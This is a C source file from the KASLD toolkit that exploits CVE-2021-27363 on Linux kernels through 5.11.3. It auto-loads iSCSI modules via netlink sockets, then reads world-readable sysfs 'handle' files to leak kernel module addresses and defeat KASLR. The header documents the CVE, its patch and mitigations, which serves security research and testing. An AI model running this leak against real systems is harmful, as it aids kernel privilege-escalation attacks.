// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel pointer to iscsi_transport struct (CVE-2021-27363)
// from /sys/class/iscsi_transport/<transport>/handle in kernels
// through 5.11.3. Discovered by Adam Nichols of GRIMM.
//
// Patched March 2021.
//
// Leak primitive:
//   Data leaked:      kernel pointer to iscsi_transport struct
//   Kernel subsystem: drivers/scsi — /sys/class/iscsi_transport/*/handle
//   Data structure:   struct iscsi_transport (module data pointer)
//   Address type:     virtual (kernel module data)
//   Method:           exact (sysfs file read)
//   CVE:              CVE-2021-27363
//   Patched:          v5.12 (multiple commits)
//   Status:           fixed in v5.12
//   Access check:     none pre-v5.12 (world-readable sysfs attribute)
//   Source:
//   https://elixir.bootlin.com/linux/v5.11/source/drivers/scsi/scsi_transport_iscsi.c
//
// Mitigations:
//   Patched in v5.12. Requires CONFIG_SCSI_ISCSI_ATTRS=y/m. The module
//   can be auto-loaded by opening a NETLINK_ISCSI socket (unprivileged).
//   The handle file is world-readable (0444); no runtime sysctl
//   can restrict access.
//
// References:
// https://nvd.nist.gov/vuln/detail/CVE-2021-27363
// https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
//
// Output:
// [.] checking /sys/class/iscsi_transport/iser/handle ...
// leaked iscsi_iser_transport address: ffffffffc067b040
// [.] checking /sys/class/iscsi_transport/tcp/handle ...
// leaked iscsi_sw_tcp_transport address: ffffffffc0634020
// ---
// <bcoles@gmail.com>

#include "include/kasld.h"
#include <errno.h>
#include <inttypes.h>
#include <linux/netlink.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "CVE-2021-27363: /sys/class/iscsi_transport/*/handle exposes the "
    "raw kernel pointer to the struct iscsi_transport, which resides "
    "in kernel module memory. This world-readable sysfs attribute was "
    "not filtered through %pK. Fixed in v5.12 by restricting the "
    "attribute to root.");

KASLD_META("method:exact\n"
           "addr:virtual\n"
           "cve:CVE-2021-27363\n"
           "patch:v5.12\n"
           "config:CONFIG_SCSI_ISCSI_ATTRS\n");

unsigned long get_kernel_addr_iscsi_iser_transport() {
  FILE *f;
  char *endptr;
  const char *path = "/sys/class/iscsi_transport/iser/handle";
  int sock_fd;
  unsigned long addr = 0;
  unsigned int buff_len = 1024;
  char buff[buff_len];

  // Try to load the scsi_transport_iscsi and ib_iser modules
  sock_fd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_RDMA);
  if (sock_fd >= 0)
    close(sock_fd);

  sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
  if (sock_fd < 0) {
    perror("[-] Failed to get a NETLINK_ISCSI socket");
    return 0;
  }

  close(sock_fd);

  /* Wait for the module to load and sysfs entries to appear.
   * Poll once per second for up to 5 seconds. */
  for (int wait = 0; wait < 5; wait++) {
    if (access(path, R_OK) == 0)
      break;
    sleep(1);
  }

  printf("[.] checking %s ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  if (fgets(buff, buff_len, f) == NULL) {
    perror("[-] fgets");
    fclose(f);
    return 0;
  }

  fclose(f);

  if (strlen(buff) > 21)
    return 0;

  addr = strtoul(buff, &endptr, 10);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

unsigned long get_kernel_addr_iscsi_sw_tcp_transport() {
  FILE *f;
  char *endptr;
  const char *path = "/sys/class/iscsi_transport/tcp/handle";
  unsigned long addr = 0;
  unsigned int buff_len = 1024;
  char buff[buff_len];

  printf("[.] checking %s ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  if (fgets(buff, buff_len, f) == NULL) {
    perror("[-] fgets");
    fclose(f);
    return 0;
  }

  fclose(f);

  if (strlen(buff) > 21)
    return 0;

  addr = strtoul(buff, &endptr, 10);

  if (addr >= KERNEL_VAS_START && addr <= KERNEL_VAS_END)
    return addr;

  return 0;
}

int main(void) {
  unsigned long addr;

  addr = get_kernel_addr_iscsi_iser_transport();
  if (addr) {
    printf("leaked iscsi_iser_transport address: %lx\n", addr);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DATA, addr,
                 "sysfs_iscsi_transport_handle:iser");
  }

  addr = get_kernel_addr_iscsi_sw_tcp_transport();
  if (addr) {
    printf("leaked iscsi_sw_tcp_transport address: %lx\n", addr);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DATA, addr,
                 "sysfs_iscsi_transport_handle:tcp");
  }

  return 0;
}
